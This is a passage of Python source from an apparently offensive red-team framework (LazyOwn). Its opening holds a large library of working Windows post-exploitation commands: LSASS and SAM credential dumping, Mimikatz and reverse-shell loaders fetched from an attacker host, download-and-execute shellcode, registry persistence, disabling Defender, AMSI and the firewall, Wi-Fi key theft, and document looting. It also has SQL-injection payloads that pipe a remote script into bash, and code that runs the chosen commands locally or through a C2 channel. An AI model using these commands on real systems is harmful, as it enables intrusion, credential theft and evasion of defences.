            ("WIN Show creds", "procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp"),
            ("WIN enum sysinfo", "hostname ; systeminfo ; cmd /c echo list volume |diskpart"),
            ("WIN ping to user", f"cmd.exe /c C: & cd\ & cd \"\" & ping {lhost} -n 1"),
            ("WIN connected network drives:", f"cmd.exe /c C: & cd\ & cd \"\" & net use"),
            ("WIN connect remote hosts via SMB", f"cmd.exe /c C: & cd\ & cd \"\" & net use \\\\{rhost} /u:{domain}\{start_user} {start_pass}"),
            ("WIN wmic lateral mov",f"cmd.exe /c C: & cd\ & cd \"\" & wmic /node:{rhost} /user:{domain}\{start_user} /password:{start_pass} process call create \"whoami\""),
            ("WIN user.txt FLAG", "Get-ChildItem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue -Force"),
            ("WIN tscon active session id 2", "tscon 2 /dest:console"),
            ("WIN shado hijack session id 2 rdp", "mstsc /shadow:2 /noconsentprompt /control /v:dc1_host"),
            ("WIN Mimikatz ps1", f"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"),
            ("WIN sc.exe change admin pass", 'sc.exe config browser binpath="C:\windows\system32\cmd.exe /c net user administrator Grisgrisgris123!"'),
            ("WIN firewall off", "netsh advfirewall set allprofiles state off"),
            ("WIN net use share", f"net.exe use T: \\\\{lhost}\\share /user:test test"),
            ("WIN AD Enum", "('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().count); ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll()"),
            ("WIN Post Exploit Amnesiac", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac.ps1');Amnesiac"),
            ("WIN Post Exploit AmnesiacShell", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac_ShellReady.ps1');Amnesiac"),
            ("WIN Post Exploit SMBRemoting", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Invoke-SMBRemoting.ps1');Invoke-SMBRemoting -ComputerName \"{subdomain}.{domain}\""),
            ("WIN Install ssh", "Start-Process \"msiexec.exe\" -ArgumentList \"/i `\"C:\\users\\grisun0\documents\OpenSSH-Win64-v9.8.1.0.msi`\" /quiet\" -Wait"),
            ("WIN ssh start service", "Start-Service sshd"),
            ("WIN ssh start service at boot", "Set-Service -Name sshd -StartupType 'Automatic'"),
            ("WIN SSH ALLOW FIREWALL", "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"),
            ("WIN SSH get state", "Get-Service -Name sshd"),
            ("WIN run dll netsh", "netsh add helper C:\\users\\grisun0\\documents\\netshhelper.dll ; netsh"),
            ("WIN ARP Table", "arp -a"),
            ("WIN Screenshot", "Add-Type -AssemblyName System.Windows.Forms"),
            ("WIN Disable Firewall", "netsh advfirewall set allprofiles state off"),
            ("WIN new user", "net user lazyown Lazy#Password123 /add"),
            ("WIN system info", "systeminfo > info.txt"),
            ("WIN netstat ano", "netstat -ano > network.txt"),
            ("WIN Steal Wifi", "netsh wlan show profile name=* key=clear > wifi.txt"),
            ("WIN are we from Admin gropup ?", "(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"),
            ("WIN Get-LocalUser Sid", "Get-LocalUser -Name $env:USERNAME | Select sid"),
            ("WIN PowerView.ps1", "powershell-import PowerView.ps1 ; powershell Get-domain"),
            ("WIN Sharp Persist", f"SharPersist.exe -t reg -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\" -k \"hkcurun\" -v \"b0x\" -m add"),
            ("WIN Persist manual", f"REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  /t REG_SZ  /v box2 /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden IEX ((new-object net.webclient).downloadstring('http://{lhost}/ps.ps1'))\""),
            ("WIN Cheks if a VM", 'reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"'),
            ("WIN Unquoted service paths", 'Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike \'"*\'} | select PathName,DisplayName,Name'),
            ("WIN DNS records enum", f'Get-DnsRecord -RecordType A -ZoneName FQDN -Server {domain}'),
            ("WIN Find bookmarks",'type "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"'),
            ("WIN Proxy Aware PS", '$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")'),
            ("WIN wmic exec",f'wmic.exe /node:{lhost} /user:username /password:pass process call create cmd.exe /c " command "'),
            ("WIN AV Cripple", '"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All'),
            ("WIN multiple RDP", 'reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f'),
            ("WIN Reg Query Uninstall", "cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
            ("WIN Reg Query WinLogon", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""),
            ("WIN Reg hidde grisun0 local admin", "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /t REG_DWORD /v grisun0 /d 0 /f"),
            ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
            ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
            ("WIN IP Configuration", "ipconfig /all"),
            ("WIN Disable AMSI", "$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') \\n $AmsiInitFailed = $AmsiUtils.GetField('amsiInitFailed', 'NonPublic,Static') \\n $AmsiInitFailed.SetValue($null,$true)"),
            ("WIN Crear Instantánea:C", 'vssadmin CREATE SHADOW /For=C: \r\n cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit c:\\NTDS.dit'),
            ("WIN copy sam1", "reg.exe save hklm\sam C:\sam.save"),
            ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
            ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
            ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
            ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'),
            ("WIN L00T","$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force"),
            ("WIN disable exec policy", "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force"),
            ("WIN RemoteSigned", "Set-ExecutionPolicy RemoteSigned -Scope Process"),
            ("WIN Disable defender", "Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0"),
            ("WIN DIsable Windows Defender AV", "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"),
            ("WIN Disable Realtime Defender", "Set-MpPreference -DisableRealtimeMonitoring $true"),
            ("WIN sam", "cd / ; mkdir Temp ; reg save hklm\sam c:\Temp\sam ; reg save hklm\system c:\Temp\system ; cd Temp ; download sam ; download system"),
            ("WIN PYPYKATZ", "pypykatz registry --sam sam system"),
            ("WIN WEB Inyection", "abc.txt | powershell -enc "),
            ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
            ("WIN ReverShell winbase64encode", f'echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),
            ("WIN enum locker", "get-applockerPolicy -effective -xml"),
            ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
            ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
            ("WIN Identify Exclusions",'& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\|*"'),
            ("WIN ADSync", "Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync"),
            ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
            ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""'),
            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
            ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
            ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
            ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b "),
            ("WEB Prestashop CVE-2020-16194", f"curl -s -k -X $'POST' --data-binary $'opart_devis_customer_id=-1&delivery_address=1&invoice_address=0&opart_devis_carrier_input=1&selected_carrier=0' $'http://{rhost}/index.php?fc=module&module=opartdevis&controller=createquotation&change_carrier_cart' ")
        ]

        filtered_commands = [(alias, cmd) for alias, cmd in commands_list if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else commands_list

        for idx, (alias, cmd) in enumerate(filtered_commands):
            if cmd:
                print_msg(f"{idx + 1}{RESET}. Alias:{YELLOW} {alias}{RESET}, Command:{GREEN} {cmd}")

        try:
            choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
            if 0 <= choice < len(filtered_commands):
                selected_alias, selected_cmd = filtered_commands[choice]
                if selected_cmd:
                    confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? l to local, r to remote, or n to no exec (l/r/n): ").strip().lower() or 'n'

                    if confirm == 'l':
                        print_warn(f"Executing command: {selected_cmd}")
                        subprocess.run(selected_cmd + " 2>/dev/null", shell=True)

                        command_clipboard = subprocess.Popen(
                            ['xclip', '-selection', 'clipboard'],
                            stdin=subprocess.PIPE
                        )
                        command_clipboard.communicate(input=selected_cmd.encode())
                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                    if confirm == 'r':
                        print_warn(f"Executing command: {selected_cmd}")
                        user = self.c2_clientid
                        self.issue_command_to_c2(selected_cmd, user)
                        command_clipboard = subprocess.Popen(
                            ['xclip', '-selection', 'clipboard'],
                            stdin=subprocess.PIPE
                        )
                        command_clipboard.communicate(input=selected_cmd.encode())
                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                    else:
                        print_warn("Command execution cancelled.")
                        command_clipboard = subprocess.Popen(
                            ['xclip', '-selection', 'clipboard'],
                            stdin=subprocess.PIPE
                        )
                        command_clipboard.communicate(input=selected_cmd.encode())
                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                else:
                    print_error("Selected command is empty.")
            else:
                print_error("Invalid choice. Please select a valid number.")
        except ValueError:
            print_error("Invalid input. Please enter a number.")
        except Exception as e:
            print_error(f"An error occurred: {e}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_sh(self, line):
        """
        Executes a shell command directly from the LazyOwn interface.

        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
        It checks if a command is provided, prints a message indicating the command being executed, and then
        runs the command using `os.system`.

        Usage:
            sh <command>

        :param line: The shell command to be executed.
        :type line: str
        :raises ValueError: If no command is provided, an error message is printed indicating that a command is required.
        :returns: None

        Example:
            sh ls -la
            # This will execute 'ls -la' in the shell without exiting LazyOwn.

        Note:
            Ensure that the command provided is safe to execute and does not include potentially harmful operations.

        """
        if not line:
            print_error(f"You must pass the command linke argument")
            return

        self.cmd(f"{line}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_sys(self, line):
        """
        Executes a shell command directly from the LazyOwn interface.

        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
        It checks if a command is provided, prints a message indicating the command being executed, and then
        runs the command using `os.system`.

        Usage:
            sh <command>

        :param line: The shell command to be executed.
        :type line: str
        :raises ValueError: If no command is provided, an error message is printed indicating that a command is required.
        :returns: None

        Example:
            sh ls -la
            # This will execute 'ls -la' in the shell without exiting LazyOwn.

        Note:
            Ensure that the command provided is safe to execute and does not include potentially harmful operations.

        """
        if not line:
            print_error(f"You must pass the command linke argument")
            return

        os.system(f"{line}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_pwd(self, line):
        """
        Displays the current working directory and lists files, and copies the current directory path to the clipboard.

        This function performs the following tasks:
        1. Displays the current working directory with `pwd` and lists files in the directory using `ls`.
        2. Copies the current directory path to the clipboard using `xclip`.

        Usage:
            pwd

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `echo -e "[\e[96m\`pwd\`\e[0m]\e[34m" && ls && echo -en "\e[0m"` is executed to display the current working directory and list files in it.
            2. The current directory path is copied to the clipboard using the command `pwd | xclip -sel clip`.

        Dependencies:
            - The function relies on `echo`, `pwd`, `ls`, and `xclip` to display the directory and copy the path to the clipboard.

        Example:
            pwd
            # This will display the current working directory, list files, and copy the current directory path to the clipboard.

        Note:
            Ensure that `xclip` is installed on your system for copying to the clipboard to work.
        """
        print_msg(
            f'Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}'
        )
        self.cmd('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
        self.cmd("pwd | xclip -sel clip")
        print_msg(f" pwd directory copied to clipboard{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_qa(self, line):
        """
        Exits the application quickly without confirmation.

        This function performs the following tasks:
        1. Prints an exit message with formatting.
        2. Terminates the `tmux` session named `lazyown_sessions` if it exists.
        3. Kills all running `openvpn` processes.
        4. Exits the program with a status code of 0.

        Usage:
            qa

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `tmux kill-session -t lazyown_sessions 2>/dev/null` is executed to kill the tmux session named `lazyown_sessions`, suppressing errors if the session does not exist.
            2. The command `killall openvpn 2>/dev/null` is executed to terminate all running `openvpn` processes, suppressing errors if no such processes are found.
            3. The program is exited with a status code of 0 using `sys.exit(0)`.

        Dependencies:
            - The function relies on `tmux`, `killall`, and `sys` to perform the exit operations.

        Example:
            qa
            # This will print an exit message, terminate the tmux session and openvpn processes, and exit the program.

        Note:
            Ensure that `tmux` and `openvpn` are installed and running for their respective commands to have an effect.
        """
        print_error(f"Exit {BG_BLACK}[👽]{RESET}")
        self.cmd("tmux kill-session -t lazyown_sessions 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        self.cmd("killall openvpn 2>/dev/null")
        sys.exit(0)

    @cmd2.with_category(miscellaneous_category)
    def do_ignorearp(self, line):
        """
        Configures the system to ignore ARP requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to ignore ARP requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            ignorearp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to assign the `arp_ignore` parameter to `1`, which configures the system to ignore ARP requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            ignorearp
            # This will assign the `arp_ignore` parameter to `1` to ignore ARP requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        self.cmd("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"    {GREEN}[+] Done.{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_ignoreicmp(self, line):
        """
        Configures the system to ignore ICMP echo requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to ignore ICMP echo requests (ping).
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            ignoreicmp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to assign the `icmp_echo_ignore_all` parameter to `1`, which configures the system to ignore ICMP echo requests (ping).

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            ignoreicmp
            # This will assign the `icmp_echo_ignore_all` parameter to `1` to ignore ICMP echo requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        self.cmd("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_acknowledgearp(self, line):
        """
        Configures the system to acknowledge ARP requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to acknowledge ARP requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            acknowledgearp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to assign the `arp_ignore` parameter to `0`, which configures the system to acknowledge ARP requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            acknowledgearp
            # This will assign the `arp_ignore` parameter to `0` to acknowledge ARP requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        self.cmd("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"Done.{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_acknowledgeicmp(self, line):
        """
        Configures the system to respond to ICMP echo requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to respond to ICMP echo requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            acknowledgeicmp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to assign the `icmp_echo_ignore_all` parameter to `0`, which configures the system to respond to ICMP echo requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            acknowledgeicmp
            # This will assign the `icmp_echo_ignore_all` parameter to `0` to allow responses to ICMP echo requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        self.cmd("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_clock(self, line):
        """
        Displays the current date and time, and runs a custom shell script.

        This function performs the following actions:
        1. Constructs a command to get the current date and time in a specified format.
        2. Uses `figlet` to display the current date and time in a large ASCII text format.
        3. Runs a custom shell script (`cal.sh`) to display additional information or perform further actions related to the clock.

        Usage:
            clock

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure that `figlet` is installed on your system for displaying text in large ASCII format.
        2. Make sure `cal.sh` exists in the `modules` directory and is executable.
        3. Run the function to see the current date and time displayed in large ASCII text, followed by the execution of `cal.sh`.

        Note: The function sets the terminal color to white before displaying the date and time, then sets it to green before running the `cal.sh` script. Finally, it resets the terminal color.

        Dependencies:
        - `figlet`: For displaying text in large ASCII format.
        - `cal.sh`: A custom shell script located in the `modules` directory.
        """

        cmd = """
        # Obtiene la fecha y hora actual en el formato deseado
        current_date=$(date +"%Y-%m-%d")
        current_time=$(date +"%H:%M:%S")
        # Muestra la fecha y hora con figlet
        figlet "$current_date"  | lolcat
        figlet "$current_time"  | lolcat
        """
        print_msg(WHITE)
        self.cmd(cmd)
        print_msg(GREEN)
        self.cmd("./modules/cal.sh | lolcat")
        print_msg(RESET)
        time.sleep(3)
        self.cmd("modules/eegg.sh")
        self.cmd("clear")
        return

    @cmd2.with_category(recon_category)
    def do_ports(self, line):
        """
        Lists all open TCP and UDP ports on the local system.

        This function performs the following actions:
        1. Calls the `get_open_ports` function to retrieve lists of open TCP and UDP ports.
        2. Prints a header for open TCP ports.
        3. Iterates over the list of open TCP ports, printing each IP address and port number.
        4. Prints a header for open UDP ports.
        5. Iterates over the list of open UDP ports, printing each IP address and port number.

        Usage:
            ports

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure the `get_open_ports` function is defined and properly implemented to return lists of open TCP and UDP ports.
        2. Run the function to display open TCP and UDP ports on the local system.

        Note: The `get_open_ports` function should return two lists of tuples: one for TCP ports and one for UDP ports. Each tuple should contain an IP address and a port number.
        """
        tcp_ports, udp_ports = get_open_ports()
        print_msg(f"Open TCP Ports:{RESET}")
        print_warn("To enter use Ctrl + Clic: ")
        for ip, port in tcp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{BLUE}{port}{RESET}")
            print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={port}")
        print_msg(f"{GREEN}Open UDP Ports:{RESET}")
        print_warn("To enter use Ctrl + Clic: ")
        for ip, port in udp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{BLUE}{port}{RESET}")
            print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={port}")
        command = "ss -ntlp"
        print_msg(f"Try... {command}")
        self.cmd(command)
        return

    @cmd2.with_category(persistence_category)
    def do_ssh(self, line):
        """
        Connects to an SSH host using credentials from a file and a specified port.

        This function performs the following actions:
        1. Retrieves the remote host (`rhost`) from the parameters.
        2. Checks if the `rhost` is valid using the `check_rhost` function.
        3. Sets the SSH port to the value provided in the `line` parameter.
        4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
        5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
        6. Constructs and executes an SSH command using `sshpass` to handle password authentication and `ssh` to initiate the connection.
        7. Displays the SSH command being executed.

        Usage:
            ssh <port>

        :param line: The port number to use for the SSH connection.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure `sessions/credentials.txt` exists and contains valid SSH credentials in the format `user:password`.
        2. Run the function with the port number as an argument.
        3. The function will attempt to connect to the SSH host using each assign of credentials and the specified port.

        Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.
        """

        rhost = self.params["rhost"]

        if not check_rhost(rhost):
            return

        if not line:
            print_warn("Port not provided as an argument, defaulting to 22.")
            line = "22"
        rport = line
        path = os.getcwd()
        credentials_file = f"{path}/sessions/credentials.txt"
        if not os.path.exists(credentials_file):
            print_error(
                "sessions/creadentials.txt must exist ex: createcredentials user:password "
            )
            return

        credentials = get_credentials()
        if not credentials:
            return

        for user, passwd in credentials:
            command = f"sshpass -p '{passwd}'  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -p {rport} {user}@{rhost}"
            print_msg(command)
            self.cmd(command)

        return

    @cmd2.with_category(persistence_category)
    def do_ftp(self, line):
        """
        Connects to an ftp host using credentials from a file and a specified port.

        This function performs the following actions:
        1. Retrieves the remote host (`rhost`) from the parameters.
        2. Checks if the `rhost` is valid using the `check_rhost` function.
        3. Sets the ftp port to the value provided in the `line` parameter.
        4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
        5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
        6. Constructs and executes an ftp command using `sshpass` to handle password authentication and `ftp` to initiate the connection.
        7. Displays the ftp command being executed.

        Usage:
            ftp <port>

        :param line: The port number to use for the ftp connection.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure `sessions/credentials.txt` exists and contains valid ftp credentials in the format `user:password`.
        2. Run the function with the port number as an argument.
        3. The function will attempt to connect to the ftp host using each assign of credentials and the specified port.

        Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return


        credentials_file = "./sessions/credentials.txt"
        if not os.path.exists(credentials_file):
            command = f"ftp anonymouse@{rhost}"
            command_ftp = "user anonymous ''"
            copy2clip(command_ftp)
            print_msg(command)
            self.cmd(command)
        else:
            if line:
                credentials = get_credentials(ncred=int(line))
            else:
                credentials = get_credentials()
            if not credentials:
                return

            for user, passwd in credentials:
                command = f"sshpass -p '{passwd}' ftp {user}@{rhost}"
                print_msg(command)
                self.cmd(command)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_cports(self, line):
        """
        Generates a command to display TCP and UDP ports and copies it to the clipboard.

        This function performs the following actions:
        1. Defines a command to display TCP and UDP ports from `/proc/net/tcp` and `/proc/net/udp`, respectively.
        2. The command extracts and formats IP addresses and port numbers from these files.
        3. Prints the generated command to the console for verification.
        4. Copies the command to the clipboard using `xclip`.

        Usage:
            cports  # Generates the command and copies it to the clipboard

        :param line: This parameter is not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function to print the command and copy it to the clipboard.
        2. The command can be pasted into a terminal to display TCP and UDP ports.

        Note: Ensure `xclip` is installed on your system for copying to the clipboard. If `xclip` is not available, you may need to install it or use an alternative method for copying to the clipboard.
        """
        rhost = self.params["rhost"]
        tcp_cmd = """echo "TCP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
        echo "UDP Ports:"; \
